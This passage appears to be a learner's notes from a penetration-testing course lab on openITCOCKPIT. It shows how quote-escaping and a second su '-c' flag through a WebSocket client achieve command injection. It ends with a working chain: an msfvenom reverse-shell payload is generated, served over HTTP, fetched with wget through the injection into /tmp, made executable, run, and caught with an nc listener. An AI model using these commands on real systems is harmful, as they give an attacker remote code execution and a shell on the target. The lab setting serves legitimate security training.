+kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
+[+] Connected!
+./check_http -I 192.168.119.120 -p 8080 -k 'string1 --help'     
+Usage: su [options] [LOGIN]
+
+Options:
+  -c, --command COMMAND         pass COMMAND to the invoked shell
+  -h, --help                    display this help message and exit
+  -, -l, --login                make the shell a login shell
+  -m, -p,
+  --preserve-environment        do not reset environment variables, and
+                                keep the same shell
+  -s, --shell SHELL             use SHELL instead of the default in passwd
+Listing 78 - Injecting help argument
+
+The output reveals the help output from the su command. Excellent!
+
+Let's pause here and try to analyze what might be going on. The WebSocket connection takes input that is expected to be executed. However, the developers did not want to allow users to run arbitrary commands. Instead, they whitelisted only certain commands (the ls command and the commands in the current directory). Given the output when we appended "--help", we can also assume that they wanted to run the commands as a certain user, so they used su to accomplish that. We can speculate that the command looks something like this:
+
+su someuser -c './check_http -I 192.168.119.120 -p 8080 -k 'test --help''
+Listing 79 - Command speculation
+
+Given that a single quote allows us to escape the command the developers expected us to run, we can reasonably assume a single quote is what encapsulates the user-provided data. We can also reasonably assume that this data is passed into the -c (short for "command") flag in su, which will be executed by the username provided to su. By appending a single quote, we can escape the encapsulation and directly inject into the su command.
+
+Since we suspect that the developers are using -c to pass in the command we are attempting to run, what will happen if we pass in another -c?
+
+kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
+[+] Connected!
+./check_http -I 192.168.119.120 -p 8080 -k 'test -c 'echo 'hacked'
+hacked
+Listing 80 - Injecting echo command
+
+In this output, the second -c argument was executed instead of the first. We can now run any command we desire. In order to simplify exploitation, we can make modifications to our client script to run code and bypass the filters.
+
+
+shell:
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST="192.168.45.204" LPORT=8888 -f elf > shell.elf
+python3 -m http.server
+./check_http -I 192.168.45.204 -p 8888 -k 'test -c 'wget http://192.168.45.204:8000/shell.elf -O /tmp/shell.elf
+./check_http -I 192.168.45.204 -p 8888 -k 'test -c 'chmod +x /tmp/shell.elf
+nc -nvlp 8888
+./check_http -I 192.168.45.204 -p 8888 -k 'test -c '/tmp/shell.elf
+
+
+```
 
 
 
